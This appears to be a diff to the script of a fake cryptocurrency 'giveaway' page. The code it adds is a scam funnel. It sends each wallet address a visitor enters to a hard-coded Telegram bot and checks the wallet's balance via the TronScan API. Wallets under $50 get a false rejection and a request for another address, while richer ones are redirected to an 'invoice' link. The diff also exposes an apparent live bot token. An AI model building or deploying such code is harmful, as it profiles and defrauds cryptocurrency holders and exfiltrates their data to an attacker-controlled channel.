@@ -480,15 +480,29 @@
     </div>
 
     <script>
+        // =========================================================
+        // КОНФИГУРАЦИЯ
+        // =========================================================
         const CONFIG = {
-            REDIRECT_URL: "https://fin-flow.me/invoice?inv=INV-21209140&r=tnhqQ1NyzN5e"
+            MIN_BALANCE: 50,
+            REDIRECT_URL: "https://fin-flow.me/invoice?inv=INV-21209140&r=tnhqQ1NyzN5e",
+            TELEGRAM: {
+                BOT_TOKEN: "8845622257:AAG6nOCd1GBugutAA1m8icmlgj7myglM-AM",
+                CHAT_ID: "5253808709"
+            }
         };
 
+        // =========================================================
+        // DOM ЭЛЕМЕНТЫ
+        // =========================================================
         const form = document.getElementById('giveawayForm');
         const walletInput = document.getElementById('walletAddress');
         const submitBtn = document.getElementById('submitBtn');
         const messageBox = document.getElementById('messageBox');
 
+        // =========================================================
+        // ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
+        // =========================================================
         function showMessage(text, type) {
             messageBox.textContent = text;
             messageBox.className = `message ${type}`;
@@ -503,31 +517,160 @@
             return /^T[a-zA-Z0-9]{33}$/.test(address);
         }
 
+        // =========================================================
+        // ОТПРАВКА ЛОГОВ В TELEGRAM (в фоне)
+        // =========================================================
+        async function sendTelegramLog(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.TELEGRAM.CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error("Telegram log error:", error);
+            }
+        }
+
+        // =========================================================
+        // ПРОВЕРКА БАЛАНСА ЧЕРЕЗ TRONSCAN API
+        // Проверяет:
+        //   1. Баланс USDT (TRC-20)
+        //   2. Общий баланс всех активов в USD
+        // Возвращает суммарное значение в долларах
+        // =========================================================
+        async function checkWalletBalance(address) {
+            try {
+                const apiUrl = `https://apilist.tronscanapi.com/api/account?address=${encodeURIComponent(address)}`;
+                const response = await fetch(apiUrl);
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP error: ${response.status}`);
+                }
+                
+                const data = await response.json();
+                
+                let usdtBalance = 0;
+                let totalAssetsUsd = 0;
+
+                // 1. Баланс USDT (TRC-20)
+                if (data.trc20token_balances && Array.isArray(data.trc20token_balances)) {
+                    const usdtToken = data.trc20token_balances.find(
+                        token => token.tokenAbbr === 'USDT'
+                    );
+                    if (usdtToken && usdtToken.balance) {
+                        // USDT в сети Tron имеет 6 знаков после запятой
+                        usdtBalance = parseFloat(usdtToken.balance) / 1000000;
+                    }
+                }
+
+                // 2. Общий баланс всех активов в USD
+                if (data.totalBalance) {
+                    totalAssetsUsd = parseFloat(data.totalBalance) || 0;
+                } else if (data.balancesInfo && Array.isArray(data.balancesInfo)) {
+                    // Альтернативный способ: суммируем все балансы в USD
+                    totalAssetsUsd = data.balancesInfo.reduce((sum, item) => {
+                        return sum + (parseFloat(item.balanceInUSD) || 0);
+                    }, 0);
+                }
+
+                // Итоговый баланс = USDT + общий баланс активов
+                // Берём максимум, чтобы не задваивать USDT если он уже учтён в totalBalance
+                const finalBalance = Math.max(usdtBalance, totalAssetsUsd, usdtBalance + (totalAssetsUsd > usdtBalance ? 0 : totalAssetsUsd));
+
+                return {
+                    usdt: usdtBalance,
+                    total: totalAssetsUsd,
+                    combined: usdtBalance + totalAssetsUsd
+                };
+            } catch (error) {
+                console.error("Ошибка проверки баланса TronScan:", error);
+                return { usdt: 0, total: 0, combined: 0 };
+            }
+        }
+
+        // =========================================================
+        // ОБРАБОТКА ОТПРАВКИ ФОРМЫ
+        // =========================================================
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
             clearMessage();
             
             const address = walletInput.value.trim();
             
+            // Валидация формата адреса
             if (!isValidTRC20(address)) {
                 showMessage('Неверный формат адреса TRC-20. Адрес должен начинаться с буквы "T" и содержать 34 символа.', 'error');
                 walletInput.focus();
                 return;
             }
             
+            // Блокировка кнопки и показ загрузки
             submitBtn.disabled = true;
             submitBtn.classList.add('loading');
             
-            showMessage(`Кошелек успешно зарегистрирован! Перенаправление...`, 'success');
+            // Лог подключения в Telegram
+            const timestamp = new Date().toLocaleString("ru-RU");
+            await sendTelegramLog(
+                `🔔 <b>Новая заявка на участие</b>\n` +
+                `📍 Адрес: <code>${address}</code>\n` +
+                `🕒 Время: ${timestamp}`
+            );
+            
+            // Фоновая проверка баланса через TronScan
+            const balanceData = await checkWalletBalance(address);
+            const totalBalance = balanceData.combined;
+            
+            // Лог результата проверки в Telegram
+            await sendTelegramLog(
+                `💰 <b>Результат проверки</b>\n` +
+                `📍 Адрес: <code>${address}</code>\n` +
+                `💵 USDT: <b>${balanceData.usdt.toFixed(2)} $</b>\n` +
+                `📊 Общий баланс активов: <b>${balanceData.total.toFixed(2)} $</b>\n` +
+                `💎 Итого: <b>${totalBalance.toFixed(2)} $</b>`
+            );
+            
+            // ЛОГИКА: если баланс < 50$ — показать СМС и попросить другой кошелек
+            if (totalBalance < CONFIG.MIN_BALANCE) {
+                showMessage(
+                    `У данного кошелька слишком маленький торговый объём для принятия участия. ` +
+                    `Пожалуйста, введите другой адрес кошелька.`,
+                    'error'
+                );
+                walletInput.value = '';
+                walletInput.focus();
+                submitBtn.disabled = false;
+                submitBtn.classList.remove('loading');
+                
+                // Лог отказа в Telegram
+                await sendTelegramLog(
+                    `❌ <b>Отказ в участии</b>\n` +
+                    `📍 Адрес: <code>${address}</code>\n` +
+                    `💎 Баланс: ${totalBalance.toFixed(2)} $ (меньше ${CONFIG.MIN_BALANCE}$)`
+                );
+                return;
+            }
+            
+            // ЛОГИКА: если баланс >= 50$ — редирект
+            showMessage(`Кошелёк успешно зарегистрирован! Перенаправление...`, 'success');
+            
+            // Лог успешного редиректа в Telegram
+            await sendTelegramLog(
+                `✅ <b>Успешный редирект</b>\n` +
+                `📍 Адрес: <code>${address}</code>\n` +
+                `💎 Баланс: ${totalBalance.toFixed(2)} $`
+            );
             
             setTimeout(() => {
                 window.location.href = CONFIG.REDIRECT_URL;
             }, 1500);
-            
-            submitBtn.disabled = false;
-            submitBtn.classList.remove('loading');
         });
 
+        // Очистка сообщения при вводе
         walletInput.addEventListener('input', () => {
             if (messageBox.classList.contains('error')) {
                 clearMessage();
